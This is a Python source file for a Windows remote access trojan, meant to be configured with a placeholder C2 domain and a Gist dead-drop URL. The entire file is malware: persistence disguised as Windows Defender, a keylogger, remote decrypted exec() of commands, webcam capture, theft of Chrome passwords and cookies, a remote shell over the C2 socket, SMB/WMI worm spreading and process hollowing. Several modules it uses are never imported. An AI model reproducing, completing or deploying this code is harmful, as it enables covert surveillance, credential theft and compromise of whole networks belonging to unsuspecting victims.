#!/usr/bin/env python3  
# -*- coding: utf-8 -*-  
import os  
import sys  
import io  
import time  
import ctypes  
import socket  
import threading  
import sqlite3  
import base64  
import zlib  
import cv2  
import requests  
import pyautogui  
import win32api  
import win32con  
import win32process  
import win32event  
import win32service  
import win32serviceutil  
import win32security  
import pythoncom  
import pyWinhook  
from Crypto.Cipher import AES  

# ===== CONFIGURATION (REPLACE THESE) =====  
SERVER_HOST = "your-c2-domain.com"  # Use Dynamic DNS domain  
GIST_URL = "https://gist.githubusercontent.com/raw/your_gist_id"  #can use pastbin or other text-hoster
AES_KEY = b'Your32ByteAESKeyForObfuscation!!'  # Must be 32 bytes  
# =========================================  

class Persistence:  
    """Indestructible persistence via 4 methods"""  
    @staticmethod  
    def install():  
        try:  
            # Method 1: Registry  
            key = win32api.RegOpenKeyEx(  
                win32con.HKEY_CURRENT_USER,  
                "Software\\Microsoft\\Windows\\CurrentVersion\\Run",  
                0, win32con.KEY_SET_VALUE  
            )  
            win32api.RegSetValueEx(key, "WindowsDefender", 0, win32con.REG_SZ, sys.executable)  

            # Method 2: Scheduled Task  
            os.system(  
                'schtasks /create /tn "WindowsUpdate" /tr "' + sys.executable +  
                '" /sc MINUTE /mo 5 /f'  
            )  

            # Method 3: WMI Event Subscription  
            os.system(  
                'wmic /namespace:\\\\root\\subscription PATH __EventFilter CREATE '  
                'Name="BotFilter", EventNamespace="root\\cimv2", QueryLanguage="WQL", '  
                'Query="SELECT * FROM __InstanceModificationEvent WITHIN 60 WHERE TargetInstance ISA \'Win32_PerfFormattedData_PerfOS_System\'"'  
            )  

            # Method 4: Service (Admin required)  
            if ctypes.windll.shell32.IsUserAnAdmin():  
                win32serviceutil.HandleCommandLine(  
                    ServiceClass=ServiceWrapper,  
                    argv=['install', '--startup', 'auto', '--name', 'WindowsDefender']  
                )  
        except Exception as e:  
            pass  

class ServiceWrapper(win32serviceutil.ServiceFramework):  
    """Hidden service for persistence"""  
    _svc_name_ = "WindowsDefender"  
    _svc_display_name_ = "Windows Defender Service"  

    def __init__(self, args):  
        super().__init__(args)  
        self.hWaitStop = win32event.CreateEvent(None, 0, 0, None)  

    def SvcStop(self):  
        self.ReportServiceStatus(win32service.SERVICE_STOP_PENDING)  
        win32event.SetEvent(self.hWaitStop)  

    def SvcDoRun(self):  
        ClientMain().start()  

class Keylogger:  
    """Threaded keylogger with dead drop check"""  
    def __init__(self):  
        self.log_path = os.path.join(os.environ['PUBLIC'], 'log.txt')  
        self.hm = pyWinhook.HookManager()  

    def start(self):  
        self.hm.KeyDown = self._on_key  
        self.hm.HookKeyboard()  
        threading.Thread(target=self._dead_drop_check).start()  
        pythoncom.PumpMessages()  

    def _on_key(self, event):  
        with open(self.log_path, 'a') as f:  
            f.write(f'[{time.ctime()}] {event.Key}\n')  
        return True  

    def _dead_drop_check(self):  
        while True:  
            try:  
                response = requests.get(GIST_URL, timeout=10).text  
                cipher = AES.new(AES_KEY, AES.MODE_EAX, nonce=base64.b64decode(response[:24]))  
                command = zlib.decompress(cipher.decrypt(base64.b64decode(response[24:])))  
                exec(command.decode())  
            except:  
                time.sleep(300)  # Retry every 5 minutes  

class Webcam:  
    """Webcam capture on demand"""  
    @staticmethod  
    def capture():  
        try:  
            cap = cv2.VideoCapture(0)  
            ret, frame = cap.read()  
            cap.release()  
            _, img = cv2.imencode('.jpg', frame)  
            return zlib.compress(img.tobytes())  
        except:  
            return b'Webcam Error'  

class BrowserStealer:  
    """Extract Chrome passwords/cookies"""  
    @staticmethod  
    def run():  
        data = []  
        try:  
            # Chrome Passwords  
            login_db = os.path.join(  
                os.environ['LOCALAPPDATA'],  
                'Google\\Chrome\\User Data\\Default\\Login Data'  
            )  
            conn = sqlite3.connect(login_db)  
            cursor = conn.cursor()  
            cursor.execute('SELECT origin_url, username_value, password_value FROM logins')  
            for url, user, pass_enc in cursor.fetchall():  
                password = win32crypt.CryptUnprotectData(pass_enc)[1].decode()  
                data.append(f'URL: {url}\nUser: {user}\nPass: {password}\n')  

            # Chrome Cookies  
            cookie_db = login_db.replace('Login Data', 'Cookies')  
            conn = sqlite3.connect(cookie_db)  
            cursor = conn.cursor()  
            cursor.execute('SELECT host_key, name, encrypted_value FROM cookies')  
            for host, name, val_enc in cursor.fetchall():  
                cookie = win32crypt.CryptUnprotectData(val_enc)[1].decode()  
                data.append(f'Cookie: {host} | {name}={cookie}\n')  
        except:  
            pass  
        return '\n'.join(data).encode()  

class ClientMain:  
    """Main RAT client with C2 communication"""  
    def __init__(self):  
        self.server = (socket.gethostbyname(SERVER_HOST), 443)  
        self.reconnect_interval = 60  

    def start(self):  
        Persistence.install()  
        threading.Thread(target=Keylogger().start, daemon=True).start()  
        threading.Thread(target=self._lateral_move, daemon=True).start()  
        while True:  
            try:  
                sock = socket.socket()  
                sock.connect(self.server)  
                self._handle_connection(sock)  
            except:  
                time.sleep(self.reconnect_interval)  

    def _handle_connection(self, sock):  
        while True:  
            try:  
                cmd = sock.recv(1024).decode()  
                if not cmd:  
                    break  

                # Command Handler  
                if cmd == 'webcam':  
                    sock.send(Webcam.capture())  
                elif cmd == 'browser':  
                    sock.send(BrowserStealer.run())  
                elif cmd.startswith('shell '):  
                    output = os.popen(cmd[6:]).read().encode()  
                    sock.send(output)  
                elif cmd == 'hollow':  
                    self._process_hollowing()  
            except:  
                break  

    def _lateral_move(self):  
        """Spread via SMB and WMI"""  
        while True:  
            try:  
                # SMB Spread  
                for ip in self._scan_network():  
                    try:  
                        with smbclient.open_file(  
                            f'\\\\{ip}\\C$\\Users\\Public\\defender.exe', 'wb'  
                        ) as f:  
                            f.write(open(sys.executable, 'rb').read())  
                        conn = wmi.WMI(ip)  
                        conn.Win32_Process.Create(CommandLine='C:\\Users\\Public\\defender.exe')  
                    except:  
                        pass  
                time.sleep(3600)  # Spread hourly  
            except:  
                pass  

    @staticmethod  
    def _scan_network():  
        """Find active hosts on the network"""  
        nm = nmap.PortScanner()  
        nm.scan('192.168.1.0/24', arguments='-p 445 --open')  
        return nm.all_hosts()  

    @staticmethod  
    def _process_hollowing():  
        """Inject into explorer.exe"""  
        try:  
            startupinfo = win32process.STARTUPINFO()  
            proc_info = win32process.CreateProcess(  
                None, "explorer.exe", None, None, False,  
                win32con.CREATE_SUSPENDED, None, None, startupinfo  
            )  
            phandle = proc_info[0]  
            base_addr = win32process.VirtualAllocEx(  
                phandle, 0, 4096,  
                win32con.MEM_COMMIT | win32con.MEM_RESERVE,  
                win32con.PAGE_EXECUTE_READWRITE  
            )  
            win32process.WriteProcessMemory(phandle, base_addr, sys.executable)  
            win32process.ResumeThread(proc_info[1])  
        except:  
            pass  

if __name__ == '__main__':  
    if len(sys.argv) > 1 and sys.argv[1] == '--service':  
        ClientMain().start()  
    else:  
        ctypes.windll.kernel32.FreeConsole()  # Hide console  
        ClientMain().start()  
